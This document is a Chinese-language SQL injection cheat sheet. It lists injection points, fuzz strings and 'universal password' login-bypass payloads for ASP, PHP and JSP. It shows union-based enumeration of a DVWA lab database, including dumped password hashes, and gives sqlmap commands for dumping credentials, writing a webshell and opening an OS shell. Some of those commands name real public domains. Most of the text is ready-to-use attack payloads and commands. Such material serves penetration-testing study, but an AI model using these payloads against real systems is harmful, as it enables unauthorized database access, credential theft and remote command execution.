注入方法
=====================================

常见的注入点
--------------------------------------
- GET/POST/PUT/DELETE参数(查询字符串，表单)
- X-Forwarded-For
- 文件名
- cookier

Fuzz注入点
--------------------------------------
- ``'`` / ``"``
- ``1/1``
- ``1/0``
- ``and 1=1``
- ``" and "1"="1``
- ``and 1=2``
- ``or 1=1``
- ``or 1=``
- ``' and '1'='1``
- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
- ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
- ``~``
- ``!``
- ``@``
- 反引号执行

- asp aspx万能密码

	``" or "a"="a``
	``') or ('a'='a``
	``or 1=1--``
	``' or 1=1--``
	``a' or '1=1--``
	``" or 1=1--``
	``' or 'a'='a``
	``" or "="a'='a``
	``' or ''='``
	``' or '='or'``
	``1 or '1'='1'=1``
	``1 or '1'='1' or 1=1``
	``' OR 1=1%00``
	``" or 1=1%00``
	``' xor``
	``用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）``
	``密码 1``
	``admin' or 'a'='a 密码随便``

- PHP万能密码

	``'or 1=1/*``
	``User: something``
	``Pass: ' or '1'='1``

- jsp 万能密码

	``1' or '1'='1``
	``admin' or 1=1/*``

测试列数
--------------------------------------
``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回

堆叠注入
--------------------------------------
堆叠注入与受限于select语句的联合查询法相反，堆叠注入可用于执行任意SQL语句。
堆叠注入的局限性：堆叠注入并不是任何换环境下都可以执行的，可能受到API或者数据库引擎不支持的限制（如Oracle数据库），也有可能权限不足。web系统中，因为代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，一般建议使用union注入.同时在使用堆叠注入之前，需要知道数据库的一些相关信息，比如：表名，列名等信息。

``http://192.168.1.100/sqllabs/Less-38/?id=1';create database aaron --+``

注释符
--------------------------------------
- MYSQL：``#(单行注释)`` , ``--+(单行注释)`` , ``/*...*/(多行注释)``
- ORACLE: ``--(单行注释)`` , ``/*...*/(多行注释)``

判断过滤规则
--------------------------------------
- 是否有trunc
- 是否过滤某个字符
- 是否过滤关键字
- slash和编码

获取信息
--------------------------------------
	
- 判断数据库表是否存在
	| ``and exsits (select * from admin)`` MySQL
	| 如：``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' and exists+(select * from guestbook)--+&Submit=Submit#``
- 确定字段数
    order by(MySQL)
	例如 ``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' order by 6--+&Submit=Submit#`` ，不断增加数字，直到返回错误
    select into(MySQL)
	例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回
- 匹配数据类型
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select 'TEST',null--+&Submit=Submit#``
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select null,'TEST'--+&Submit=Submit#``
	注：只要程序不出现错误，就知道存储TEST值的列可以保存一个字符串。
	
测试权限
--------------------------------------
- 文件操作
    - 读敏感文件
    - 写shell
- 带外通道
    - 网络请求
	
MYSQL实战
--------------------------------------
- 查询数据库
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select null,schema_name from information_schema.schemata--+&Submit=Submit#``
	::
	
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: admin
		Surname: admin
		
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: 
		Surname: information_schema
		
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: 
		Surname: dvwa``
		
- 查询表名
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'--+&Submit=Submit#``
	::
	
		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: admin
		Surname: admin

		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: dvwa
		Surname: guestbook

		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: dvwa
		Surname: users
		
- 查询列名
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_name,column_name from information_schema.columns where table_name='users'--+&Submit=Submit#``
	::
	
		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: admin
		Surname: admin

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: user_id

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: first_name

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: last_name

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: user

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: password

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: avatar
		
- 查询数据
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select user_id,password from users--+&Submit=Submit#``
	::
	
		ID: 1' union select user_id,password from users-- 
		First name: admin
		Surname: admin

		ID: 1' union select user_id,password from users-- 
		First name: 1
		Surname: 21232f297a57a5a743894a0e4a801fc3

		ID: 1' union select user_id,password from users-- 
		First name: 2
		Surname: e99a18c428cb38d5f260853678922e03

		ID: 1' union select user_id,password from users-- 
		First name: 3
		Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

		ID: 1' union select user_id,password from users-- 
		First name: 4
		Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

		ID: 1' union select user_id,password from users-- 
		First name: 5
		Surname: 5f4dcc3b5aa765d61d8327deb882cf99

		ID: 1' union select user_id,password from users-- 
		First name: 6
		Surname: ee11cbb19052e40b07aac0ca060c23ee

sqlmap教程
--------------------------------------
- 默认选择不询问用户输入
	--batch
- 默认使用level1检测全部数据库类型
	``sqlmap -u http://www.vuln.cn/post.php?id=1`` 
- 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
	``sqlmap -u http://www.vuln.cn/post.php?id=1  –dbms mysql –level 3``
- cookie注入
	``sqlmap -u http://www.baidu.com/shownews.asp –cookie “id=11” –level 2``
- 从POST数据包注入
	``sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql`` 
- 列举数据库管理系统中的用户
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –users`` 
- 列举并破解数据库管理系统用户密码Hash值
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql --passwords -v 1`` 
- 列举数据库管理系统的用户权限
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –privileges`` 
- 获取数据库基本信息
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs``
- 查询test数据库中有哪些表
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables``
- 查询test数据库中admin表有哪些字段
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns``
- dump出admin表中用户名和密码的数据
	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump``
- 在dedecms数据库中搜索字段admin或者password
	``sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password``
- 读取与写入文件
	| 首先找需要网站的物理路径，其次需要有可写或可读权限.
	| –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
	| –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
	| –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
	| ``sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”``
- 执行命令
	``sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig`` 
- 使用shell命令
	``sqlmap -r “c:\tools\request.txt” -p id –dms mysql –-os-shell``
